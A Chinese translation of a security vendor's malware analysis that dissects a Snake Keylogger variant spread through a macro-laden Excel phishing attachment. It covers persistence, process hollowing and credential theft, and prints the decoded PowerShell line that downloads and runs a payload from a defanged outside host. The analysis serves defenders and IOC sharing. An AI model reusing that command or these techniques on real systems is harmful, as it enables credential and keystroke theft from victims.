**译者：知道创宇404实验室翻译组  
原文链接：<https://www.fortinet.com/blog/threat-research/deep-dive-into-a-fresh-variant-of-snake-keylogger-malware>**

## 前言

Fortinet 的 FortiGuard 实验室最近发现了一个用于传播恶意软件的微软 Excel 样本。在研究了它的行为之后，我发现它是 Snake
Keylogger 恶意软件的一个新变种。

Snake
Keylogger是一个模块化的`.NET`键盘记录器。它最早出现在2020年末，主要行为是从受害者的设备中窃取敏感信息，包括保存的证书、受害者的按键、受害者屏幕的截图和剪贴板数据。

2021年7月，Snake Keylogger 首次进入 TOP 10大流行恶意软件报告，这意味着 Snake Keylogger
影响力正在增加，并威胁更多人的设备和敏感数据。

在这个威胁研究博客中，你将了解 Snake Keylogger 的变体是如何通过捕获的 Excel
样本下载和执行的，这个变体使用了什么技术来保护它不被分析，它从受害者的机器上窃取了什么敏感信息，以及它如何将收集到的数据提交给攻击者。

我们开始吧。

## 捕获的 Microsoft Excel 样本是什么样子

此 Excel 样本以钓鱼邮件附件的形式发送，内含恶意的 Macro VBA
代码。下图显示了该文件打开时的屏幕截图。它会显示一个模糊的文档图片，并要求受害者点击黄色按钮以获得一个更清晰的图像。

![](https://images.seebug.org/content/images/2021/11/76ef61b6-f207-4af0-ab17-3d071df0e7ff.png-w331s)
打开 Excel 文件时的内容

一旦受害者单击黄色按钮“ Enable Content”，恶意的 `VBA` 代码就会在后台执行。这个恶意宏项目包含恶意 VBA
代码，受密码保护，因此分析程序无法查看该代码。但是，我们可以修改它的二进制文件来消除这个限制。

检查其代码时，在打开文档时会自动调用“`Workbook _ activate()`”方法。它将一段 `PowerShell`代码从本地变量写入到 BAT
文件中。下图显示了此方法的部分 VBA 代码，其中变量“s”保存 PowerShell 代码，“`Gqyztfbtsogpnruooqr.BAT`”是
BAT 文件，最后通过调用代码“ `x = Shell (BAT，0)`”执行。

![](https://images.seebug.org/content/images/2021/11/46427af9-c3f3-4d1b-b4b8-f7bfa93889a8.png-w331s)
在后台执行的宏 VBA 代码

图的底部显示了变量“ s”的内容，其中包含执行时由`PowerShell.exe`解码的`base64`编码的PowerShell代码。

下面是 base64解码的 PowerShell 代码:

    
    
    $ProcName = "Wheahmnfpgaqse.exe";
    (New-Object System.Net.WebClient). DownloadFile ("hxxp[:]//3[.]64[.]251[.]139/v3/2/Requests07520000652.exe","$env:APPDATA\$ProcName");
    Start-Process ("$env:APPDATA\$ProcName")

PowerShell 代码非常简单且易于理解。它将一个文件(“`Requests07520000652.exe`”)下载到受害者的设备上，通过调用“
`DownloadFile ()`”将其置于“`% AppData% Wheahmnfpgaqse.exe`”，并通过调用“`Start-Process
()`”执行该文件。

## Snake Keylogger 下载程序

经过一些研究，我了解到“`Wheahmnfpgaqse.exe`”文件是 Snake Keylogger
的下载程序，它是一个.Net程序。当它启动时，它会休眠21秒，用以绕过沙盒，并在触发无动作超时的时候终止示例进程。

![](https://images.seebug.org/content/images/2021/11/b97e2f25-d756-4286-b45b-0dd11b42a20f.png-w331s)
在休眠后下载和解密 Snake Keylogger 模块

21秒后，下载程序调用一个名为“ `Consturctor
()`”的函数，如图所示。然后调用另一个函数“`Program.List_Types()`”，其中它从链接“`hxxps[:]//store2[.]gofile[.]io/download/0283e6ba-afc6-4dcb-b2f4-3173d666e2c4/Huzeigtmvaplpinhoo.dll`”下载 Snake Keylogger 模块，它是
`RC4`加密的 DLL 文件。接下来，它调用“ `ToRc ()`”函数来使用解密密钥“`Dllzjn`”对 RC4进行解密。

然后它继续加载解密的 Dll 模块(一个.Net Dll 文件，名为“ `huzeigtmvaplpinhoo.Dll`”) ，并枚举它的导出函数以查找“
`G6doICqoMU ()`”，该函数通过执行函数`Consturctor
()`中的“`type.InvokeMember(\“G6doICqoMU\”，BindingFlags.InvokeMethodnull，null，null，null)`”调用。如图所示。已经解密的.Net
Dll 是 Snake Keylogger的种植和安装程序。

让我们深入这个模块，看看它是如何执行任务的。

## Snake Keylogger 安装程序

根据我的分析，解密的 Dll 模块(“ huzeigtmvplpinhoo.Dll”)将 Snake Keylogger
部署到受害者的设备上，并将其设置为自动运行程序。它从 Resource 目录中提取一个可执行的 PE 文件到内存中，然后执行进程空心化，将可执行的 PE
文件注入到新创建的子进程中并执行它。

我将在本节中详细解释它是如何执行这些功能的。

### 1.持久性机制

![](https://images.seebug.org/content/images/2021/11/2df6ee0a-3859-417d-bea5-165508be9a43.png-w331s)
调试器 dnSpy 中导出函数“ G6doICqoMU ()”的中断

上图显示了解密的 Dll 模块(“
huzeigtmvplpinhoo.Dll”)的大纲。如图所见，为了防止其代码被分析，文件被模糊化，因此类名、函数名和变量名都是随机生成的无意义字符串，分析人员分析它时会很麻烦。

导出函数“ G6doICqoMU ()”的全名是“ `huzeigtmvaplpinhoo!
pxfqpio3clcaofxfj.corfgloyrglurywdwih.G6doICqoMU
()`”。同样，出于同样的目的，它在这个函数开始时休眠35秒，以绕过一些恶意软件分析系统。

接下来，它将使这个 Snake Keylogger 程序在受感染的 Windows 上持久化。众所周知，Windows
系统在“开始菜单”中有一个“启动”文件夹。该文件夹中的程序在 Windows
启动时启动。该文件夹的完整路径在系统注册表中定义，字符串值为“`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell
Folders\Startup`”和“`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User
Shell Folders\Startup`”。“
Startup”的值数据默认为“`C:\Users\{UserName}\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Startup`”。

Snake Keylogger 的这个变体将“ Startup”的值改为其他文件夹的值。下图显示，通过调用 `API SetValue ()`将
Windows 启动文件夹更改为“`C:\Users\M0YTes0Env\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\chsg\`”的代码。 在图的下半部分，您可以看到系统注册表路径、值名称和新值数据的内容。

![](https://images.seebug.org/content/images/2021/11/daefe01d-549e-4fb2-abfa-d70eec35c193.png-w331s)
将 Windows“ Startup”文件夹更改为新路径

“`chsg`”是由 Snake Keylogger 创建的一个新文件夹。程序将 Snake Keylogger 文件(下载的“
`Wheahmnfpgaqse.exe`”)复制到这个文件夹中，并将其重命名为“`sgosr.exe`”。这可以确保每次启动 Snake
Keylogger程序时，Windows 系统都会启动它。

### 2.从资源中提取

尽管 Huzeigtmvaplpinhoo.dll 的内容只出现在内存中，但为了分析它，我将它保存到一个本地文件中。它在 Resource
目录中有几个资源，如下图所示。

![](https://images.seebug.org/content/images/2021/11/8bf51956-0c30-44b3-a0b6-fe9c8f3b1392.png-w331s)
Huzeigtmvaplpinhoo.dll的资源目录显示

提取 Snake Keylogger 的有效负载文件的过程有点复杂。它使用了一种狡猾的方式来加载资源。它有一个由 `ResolveEventHandler`
定义的本地回调函数，该函数注册到 `AppDomain.ResourceResolve`，当它未能按名称加载资源时会被调用。它看起来像是
windowsSEH
策略处理异常的异常处理程序。此外，它还有另一个注册到`AppDomain.AssemblyResolve`的本地回调函数，当它未能按名称加载程序集(如模块)时会被调用。

下面是注册本地资源解析的伪代码，其中`T9wOjU5ccxTJaVfUntn. Osc50oil0l`是本地回调函数。

    
    
    AppDomain.ResourceResolve += new ResolveEventHandler(T9wOjU5ccxTJaVfUntn.Osc50oil0l)

现在，让我们看看 Snake Keylogger
是如何解决这个挑战的——加载一个不存在的资源，这将触发资源加载失败。它计划从当前模块中读取一个名为“`Qkxkikeg`”的资源，该模块在 Resource
目录中没有这样的命名资源，如图所示。资源加载失败提示出现，注册的本地`ResolveEventHandler`
函数被调用来解决此错误。这将导致加载程序集失败，其程序集解析回调函数被调用。

不久之后，从“`{ d977ee8c-85ce-4731-b9a1-323ba88c6eeb }`”资源解密的另一个 PE
文件出现在内存中。它包含一个名为“Qkxkikeg”的资源，这是原始请求资源名称，如图所示。

![](https://images.seebug.org/content/images/2021/11/db87feff-d309-4c4b-819b-aa06e23dfc9d.png-w331s)
另一个模块中的“Qkxkikeg”资源

Snake Keylogger 的有效负载是 GZIP 格式压缩文件，存在于 Resource 目录“
ClassLibrary1.Properties”下的资源“Qkxkikeg”中。

下图左侧显示资源“ Qkxkikeg”(反向)的 GZIP 数据，右侧显示解压缩的 Snake Keylogger。

![](https://images.seebug.org/content/images/2021/11/0518e53d-cf15-4f89-8507-76cc8e4b4af7.png-w331s)
“Qkxkikeg”的压缩和解压缩数据

### 3.进程空洞化

然后，该程序创建一个挂起的子进程，并将压缩的 Snake Keylogger
有效负载部署到子进程中。然后恢复要运行的子进程。同时，父进程通过调用`Environment.Exit(0)`函数退出。

![](https://images.seebug.org/content/images/2021/11/fcad5852-4e68-4303-8228-135af609b9e8.png-w331s)
创建一个挂起的子进程

根据上图中的代码，它将调用`API CreateProcess ()`来创建子进程，并使用`Creation Flag 134217732U
(0x80000004)` ，也就是 `CREATE_NO_WINDOW` 和`CREATE_SUSPENDED`。

然后调用`API WriteProcessMemory ()`将 Snake Keylogger 有效负载逐节复制到子进程中。然后调用
`SetThreadContext ()` ，使子进程指向 Snake Keylogger 的入口点函数。在父进程退出之前，将调用一个 API
resumread ()来还原子进程以便运行。

## Snake Keylogger 有效载荷

![](https://images.seebug.org/content/images/2021/11/5bc00cd7-5221-41c6-868a-0b9cc09786eb.png-w331s)
完全混淆化的 Snake Keylogger有效负载

Snake Keylogger 有效负载文件的代码完全模糊化（如图所示）以保护它不被分析，类名和函数名也无法读取。

因此，为了更好地分析和解释其代码和意图，我使用“de4dot”工具对有效载荷文件进行了去模糊处理。这使得它的代码更具可读性，我的分析就是基于这个结果。

浏览 Snake
Keylogger代码时，我发现到它具备一些功能，比如记录受害者的击键(键盘记录器)、从剪贴板上窃取数据、获取受害者的屏幕截图、窃取系统剪贴板上的数据，以及窃取安装在受害者设备上的某些特定软件客户端的保存凭证。

### 1.键盘记录器功能

下图显示了设置键盘记录器的代码片段。

![](https://images.seebug.org/content/images/2021/11/a3dfee7a-a313-4399-ad2a-9949bf9acc96.png-w331s)
键盘记录器的初始化

它调用`API SetWindowsHookExA ()`来注册一个钩子回调函数(`this.callback _ processkey
()`)来监视低级别键盘输入事件。第一个参数是钩子类型，其中“13”表示`WH_KEYBOARD_LL`。

在此之后，当受害者打字时，Windows 系统调用回调函数，该函数能够处理并记录击键到全局字符串变量中。它还通过调用`api
GetForegroundWindow ()`和`gettwindowtext ()`来记录前景窗口标题，以确定受害者打字的区域。

它还有一个定时器 (Timer0) ，可以不断地向攻击者发送键盘记录器数据。

### 2.屏幕截图

它可以截取受害者设备的屏幕截图。它有一个定时器(Timer1) ，可以通过调用`API CopyFromScreen ()`
不断捕获受害者的屏幕截图。它将截图保存到系统的“ `MyDocuments`”文件夹中的一个本地 `Screenshot.png`
文件中。它还将这个图片文件发送给攻击者。

### 3.系统剪贴板

它有两个定时器。一个(Time2)用于通过调用 `Clipboard.GetText ()`
收集系统剪贴板数据并保存到全局变量。另一个(Time3)用于将收集到的剪贴板数据发送给攻击者。

![](https://images.seebug.org/content/images/2021/11/0e13f526-590a-4f5f-a4c4-c8f73c92a7e0.png-w331s)
获取系统剪贴板数据的定时器函数

上图显示了用于获取系统剪贴板数据的 Timer 函数。每次计数时，它都会检查当前剪贴板数据是否已经在全局变量
`main_cls.string_clipboard_data` 中收集。字符串剪贴板数据。如果没有，则将当前剪贴板数据附加到全局变量。

### 4.窃取证书

根据我的分析，这个变种的主要工作是从受害者的设备中窃取证书。它在`Main ()`函数中实现了窃取凭据，如下图所示。

![](https://images.seebug.org/content/images/2021/11/5c6363ef-2e94-4014-821e-2bf7002b950e.png-w331s)
Main () ，其功能是窃取凭证并提交凭证

这是模糊化的 Main ()函数，用于从各种客户机窃取凭据。底部的函数提交被盗的凭据。这些函数从保存每个软件的不同地方获得保存的凭证，包括本地文件(如
Chrome)和系统注册表(如 Outlook)等。

现在我将以 Outlook 为例来演示 Snake Keylogger 是如何收集凭据的。

下图是一个即将从系统注册表读取 Microsoft Outlook 凭据的函数的截图。它通过四个注册表路径为不同的 Outlook
版本读取数据(如果适用)，如“电子邮件”和“ IMAP 密码”或“POP3密码”或“ HTTP 密码”或“ SMTP 密码”和“ SMTP 服务器”。

![](https://images.seebug.org/content/images/2021/11/8ef3fe26-ff9e-41a9-9527-9a380ed1b8ae.png-w331s)
从Microsoft Outlook 收集保存的凭据的函数

下面是一个示例，展示了 Snake Keylogger 可以从 Microsoft Outlook 收集哪些凭证信息:

> \-------- Snake Keylogger --------  
>  Found From: Outlook  
>  URL: smtp.gmail.com  
>  E-Mail: victim_email@gmail.com  
>  PSWD: {Password}

我将 Snake Keylogger 攻击的客户分类如下:

  * 浏览器:

> Google Chrome, Mozilla Firefox, Mozilla SeaMonkey Browser, Mozilla IceCat
> Browser, Yandex Browser, Microsoft Edge, Amigo Browser, Nichrome Browser,
> QQBrowser, Coccoc Browser, Orbitum Browser, Slimjet Browser, Iridium
> Browser, Vivaldi Browser, Iron Browser, Ghost Browser, Cent Browser, Xvast
> Browser, Chedot Browser, SuperBird Browser, 360 Browser, 360 Secure Browser,
> Comodo Dragon Browser, Brave-Browser, Torch Browser, UC Browser, Blisk
> Browser, Epic Privacy Browser, Opera Web Browser, Liebao Browser, Avast
> Browser, Kinza Browser, BlackHawk Browser, Citrio Browser, Uran Browser,
> Coowon Browser, 7 Star Browser, QIP Surf Browser, Sleipnir Browser, Chrome
> Canary Browser, CoolNovo Browser, SalamWeb Browser, Sputnik Browser
> Extension, Falkon Browser, Elements Browser, Slim Browser, Ice Dragon
> Browser, CyberFox Browser, PaleMoon Browser, Waterfox Browser, Kometa
> Browser and various browsers designed based on Chromium project.

  * 电邮客户端:

> Microsoft OutLook, Tencent Foxmail, Mozilla Thunderbird and Postbox.

  * 其他客户:

> FileZilla, Pidgin and Discord.

## 向攻击者发送被盗数据

根据 Snake Keylogger 的这个变体的代码，它向攻击者发送一封电子邮件(使用 SMTP 协议)来提交受害者被盗的凭据数据。

Snake Keylogger 收集关于受害者 Windows 系统的基本信息，比如用户名、 PC 名、系统日期和时间、公共 IP
地址和国家，这些信息被放在已收集凭据的header处。

![](https://images.seebug.org/content/images/2021/11/15dab288-3382-42a9-8cc0-935243b33d35.png-w331s)
含窃取凭证的邮件

上图显示了把窃取凭据发送给攻击者的电子邮件。底部是电子邮件的主题和主体。盗取的凭证被放在“`Passwords.txt`”和“`User.txt`”两个附件中。下图是“Password.txt”的屏幕截图，该截图附在发送给攻击者的电子邮件中，其中的基本信息和凭据是从我的测试
Windows 系统中盗取的。

![](https://images.seebug.org/content/images/2021/11/2b0c5460-456d-450c-b5a3-7600917286c7.png-w331s)
“Password.txt”样本

为了向攻击者发送被盗数据，它定义了一些变量，包含发送者的电子邮件地址、密码、 SMTP 服务器地址和 SMTP
端口，如下图所示，它定义了类的构造函数中的变量。

![](https://images.seebug.org/content/images/2021/11/6cc21a77-6086-497b-b2af-788d519b47fc.png-w331s)
攻击者的电子邮件地址在构造函数中是硬编码的

除了通过电子邮件发送数据，这个 Snake Keylogger 变种还提供 FTP 和 Telegram 方法，将收集到的敏感数据提交给攻击者。

对于 FTP，攻击者需要设置一个 FTP 服务器，然后告诉 Snake Keylogger FTP 服务器的地址和 Snake
Keylogger上传敏感数据需要的凭据。

对于 Telegram，Snake Keylogger 使用“ Telegram Bot API”的“
sendDocument”方法将其盗取的数据提交给攻击者提供的 Telegram 帐户。有关 Telegram 方法的更多信息，请参见下图。

![](https://images.seebug.org/content/images/2021/11/78d4442b-b1cd-4b0f-8675-a9dc766feb85.png-w331s)
使用 Telegram 提交数据的部分代码

## 结论

为了更好地理解这个恶意软件的整个过程，我在下图中绘制了一个流程图，概述了分析中解释的主要步骤。

![](https://images.seebug.org/content/images/2021/11/d7ccf1b9-9380-4558-8822-56929c0d0b7e.png-w331s)
Snake Keylogger 变体的流程图

在本文的开头，我们介绍了 Excel 文档中的恶意宏是如何执行 PowerShell用来下载 Snake Keylogger下载程序的。

接下来，我更关注 Snake Keylogger 安装程序如何对受害者的设备执行持久化，以及它提取 Snake Keylogger
的有效负载的复杂而棘手的方法。

然后，我详细介绍了 Snake Keylogger 的这个变体所提供的功能，比如记录击键、收集凭证数据、剪贴板数据和屏幕截图。

最后，我解释了电子邮件是如何通过将收集到的数据提交给攻击者，以及另外两种方法: FTP 和 Telegram。

## IOCs

### URLs:

"hxxp[:]//3[.]64[.]251[.]139/v3/2/Requests07520000652.exe"
"hxxps[:]//store2[.]gofile[.]io/download/0283e6ba-afc6-4dcb-b2f4-3173d666e2c4/Huzeigtmvaplpinhoo.dll"

### 示例 SHA-256:

[SOA# 1769.xlsm]
3B437BAA9A07E9DECE2659F20B5D97F8F729BA077D399933041CDC656C8D4D04

[Requests07520000652.exe or Wheahmnfpgaqse.exe]
53D520C1F12FE4E479C6E31626F7D4ABA5A65D107C1A13401380EBCA7CCA5B05 References:

## 参考文献:

<https://blog.checkpoint.com/2021/08/12/july-2021s-most-wanted-malware-snake-keylogger-enters-top-10-for-first-time/>
<https://docs.microsoft.com/enus/dotnet/api/system.appdomain.assemblyresolve?view=net-5.0>
<https://docs.microsoft.com/enus/dotnet/api/system.appdomain.resourceresolve?view=net-5.0>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1752/>

